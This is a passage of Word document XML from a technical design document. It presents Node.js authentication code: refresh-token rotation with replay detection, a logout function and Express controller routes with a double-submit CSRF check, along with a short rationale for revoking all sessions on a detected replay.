              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try { payload = jwt.verify(rawRefreshToken, jwtCfg.refreshSecret, { algorithms:[jwtCfg.alg] }); }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  catch { throw errors.unauthorized('Invalid refresh token'); }</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const stored = await refreshRepo.findValid(rawRefreshToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!stored) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    // ★ THEFT DETECTION ★ — valid signature, no DB match → assume replay</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await refreshRepo.revokeAllForUser(payload.uid, 'ADMIN_REVOKE');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw errors.unauthorized('Refresh token not recognised — please sign in again');</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 Atomic-ish rotation: revoke BEFORE issuing the replacement</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await refreshRepo.revoke(rawRefreshToken, 'ROTATED');</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const user = await usersRepo.findByEmployeeId(payload.sub);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!user || !user.is_active || user.is_locked) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw errors.unauthorized('User account is no longer active');</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const { role_code, permissions } = await usersRepo.loadRoleAndPermissions(user.user_id);</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const accessPayload = { sub: user.employee_id, uid: user.user_id, role: role_code, permissions };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const accessToken     = signAccess(accessPayload, user.user_id);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const newRefreshToken = signRefresh(user);</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const expiresAt = dayjs().add(jwtCfg.refreshTtlSec, 'second').toDate();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await refreshRepo.persist({ userId: user.user_id, rawToken: newRefreshToken,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                              expiresAt, userAgent, ipAddress });</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await auditRepo.record({ employeeId: user.employee_id, outcome: 'TOKEN_REFRESH',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                           ipAddress, userAgent });</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return { accessToken, refreshToken: newRefreshToken, user: accessPayload };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEE2E2"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B91C1C"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B91C1C"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">SECURITY  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Theft-detection rationale</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Refresh rotation alone protects against ONE-TIME replay: a stolen token is invalidated after the legitimate user's next refresh.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>But what about: attacker steals the token, legit user refreshes (token now rotated), attacker tries the OLD token? Their request still carries a valid signature, but the hash isn't in refresh_tokens any more → without theft detection it would just silently fail.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>With theft detection: we recognise 'valid signature + DB miss' as the unmistakable replay pattern and defensively kill EVERY session for that user. Both attacker AND legit user re-login; only the legit user has the password.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.7.3  logout()</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auth.service.js · logout()</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>async function logout({ rawRefreshToken, employeeId, ipAddress, userAgent }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (rawRefreshToken) await refreshRepo.revoke(rawRefreshToken, 'LOGOUT');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (employeeId)      await auditRepo.record({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    employeeId, outcome: 'LOGOUT', ipAddress, userAgent });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.8  auth.controller.js — Thin HTTP Shims</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src/modules/auth/auth.controller.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('../../config/env');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const service = require('./auth.service');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { randomToken } = require('../../utils/crypto');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { errors } = require('../../middleware/errorHandler');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  REFRESH_COOKIE_NAME, CSRF_COOKIE_NAME,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  refreshCookieOpts, csrfCookieOpts,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>} = require('../../utils/cookies');</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async function postLogin(req, res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const { employee_id, password } = req.body;   // already zod-parsed</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const { accessToken, refreshToken, user } = await service.login({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      employeeId: employee_id, password,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      ipAddress: req.ip, userAgent: req.headers['user-agent'] || '' });</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res.cookie(REFRESH_COOKIE_NAME, refreshToken, refreshCookieOpts(env));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const csrfToken = randomToken();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    res.cookie(CSRF_COOKIE_NAME, csrfToken, csrfCookieOpts(env));</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return res.json({ data: { accessToken, csrfToken, user } });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (e) { return next(e); }</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async function postRefresh(req, res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const rawRefreshToken = req.cookies[REFRESH_COOKIE_NAME];</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    // Double-submit CSRF check</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const csrfHeader = req.headers['x-csrf-token'];</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const csrfCookie = req.cookies[CSRF_COOKIE_NAME];</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!csrfHeader || !csrfCookie || csrfHeader !== csrfCookie) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      throw errors.forbidden('CSRF token missing or mismatched');</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const { accessToken, refreshToken, user } = await service.refresh({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      rawRefreshToken, ipAddress: req.ip,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      userAgent: req.headers['user-agent'] || '' });</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res.cookie(REFRESH_COOKIE_NAME, refreshToken, refreshCookieOpts(env));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const newCsrf = randomToken();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    res.cookie(CSRF_COOKIE_NAME, newCsrf, csrfCookieOpts(env));</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return res.json({ data: { accessToken, csrfToken: newCsrf, user } });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (e) { return next(e); }</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async function postLogout(req, res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const rawRefreshToken = req.cookies[REFRESH_COOKIE_NAME];</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const employeeId = req.user &amp;&amp; req.user.employeeId;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await service.logout({ rawRefreshToken, employeeId,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                           ipAddress: req.ip,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                           userAgent: req.headers['user-agent'] || '' });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    res.clearCookie(REFRESH_COOKIE_NAME, refreshCookieOpts(env));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    res.clearCookie(CSRF_COOKIE_NAME,    csrfCookieOpts(env));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return res.status(204).end();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (e) { return next(e); }</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module.exports = { postLogin, postRefresh, postLogout };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.9  auth.routes.js — URL Wiring</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src/modules/auth/auth.routes.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
